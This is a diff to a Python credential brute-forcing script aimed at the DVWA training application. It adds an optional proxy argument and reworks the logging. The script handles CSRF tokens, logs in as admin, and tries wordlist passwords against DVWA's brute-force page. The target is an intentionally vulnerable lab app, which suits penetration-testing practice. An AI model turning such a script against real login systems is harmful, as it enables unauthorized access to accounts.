@@ -7,12 +7,11 @@ import logging
 import sys
 import re
 
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 GREEN = '\033[92m'
 RED = '\033[91m'
 RESET = '\033[0m'
 
-def get_response(session, url):
+def get_response(session, url, proxies=None):
     try:
         response = session.get(url, proxies=proxies)
         response.raise_for_status()
@@ -35,7 +34,7 @@ def get_token(response):
         logging.error(f"Error in processing token: {str(e)}")
         return None
 
-def login(session, url, user_token):
+def login(session, url, user_token, proxies=None):
     try:
         payload = {
             'username': 'admin',
@@ -50,7 +49,7 @@ def login(session, url, user_token):
     except requests.RequestException as e:
         logging.error(f"Error in login request: {str(e)}")
 
-def set_security(session, url, user_token):
+def set_security(session, url, user_token, proxies=None):
     try:
         payload = {
             'security': 'high',
@@ -64,7 +63,7 @@ def set_security(session, url, user_token):
     except requests.RequestException as e:
         logging.error(f"Error in security request: {str(e)}")
 
-def brute(username, password, user_token, session, url):
+def brute(username, password, user_token, session, url, proxies=None):
     try:
         params = {
             'username': username,
@@ -79,7 +78,7 @@ def brute(username, password, user_token, session, url):
             user_token = get_token(response)
             return user_token
         else:
-            logging.info(f"Found valid credentials- {GREEN}{username}:{password}{RESET}")
+            logging.info(f"Found valid credentials: {GREEN}{username}:{password}{RESET}")
             return None
     except requests.RequestException as e:
         logging.error(f"Error in brute request: {str(e)}")
@@ -93,6 +92,7 @@ def main():
     parser.add_argument('-P', '--passwords', required=True, help='Path to the password wordlist file')
     parser.add_argument('-b', '--base-url', default='http://localhost/DVWA/', help='Base URL for the DVWA instance. Example: http://192.168.1.137/dvwa/')
     parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity level to DEBUG')
+    parser.add_argument('-x', '--proxy', default=None, help='Proxy address in the format http://host:port')
     args = parser.parse_args()
 
     password_wordlist_file = args.passwords
@@ -117,25 +117,34 @@ def main():
         logging.error("No usernames provided")
         sys.exit(1)
 
-    user_token = get_response(session, base_url + 'login.php')
-    if user_token:
-        login(session, base_url + 'login.php', user_token)
+    proxies = None
+    if args.proxy:
+        if args.proxy.strip():
+            proxies = {'http': args.proxy, 'https': args.proxy}
+        else:
+            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-    user_token = get_response(session, base_url + 'security.php')
+    user_token = get_response(session, base_url + 'login.php', proxies)
     if user_token:
-        set_security(session, base_url + 'security.php',user_token)
-        
+        login(session, base_url + 'login.php', user_token, proxies)
+
+    user_token = get_response(session, base_url + 'security.php', proxies)
+    if user_token:
+        set_security(session, base_url + 'security.php', user_token, proxies)
+
     found_credentials = False  # Flag to track if valid credentials were found
     for username in usernames:
-        user_token = get_response(session, base_url + 'vulnerabilities/brute/')
+        user_token = get_response(session, base_url + 'vulnerabilities/brute/', proxies)
         if user_token:
             with open(password_wordlist_file, 'r') as passwords:
                 for password in passwords:
-                    user_token = brute(username, password.strip(), user_token, session, base_url + 'vulnerabilities/brute/')
+                    user_token = brute(username, password.strip(), user_token, session, base_url + 'vulnerabilities/brute/', proxies)
                     if user_token is None:
                         found_credentials = True
                         break
-            if not found_credentials:
-                logging.info(f"Username: {RED}{username}{RESET} - No valid credentials could be found")
+
+    if not found_credentials:
+        logging.info("No valid credentials were found")
+
 if __name__ == '__main__':
     main()
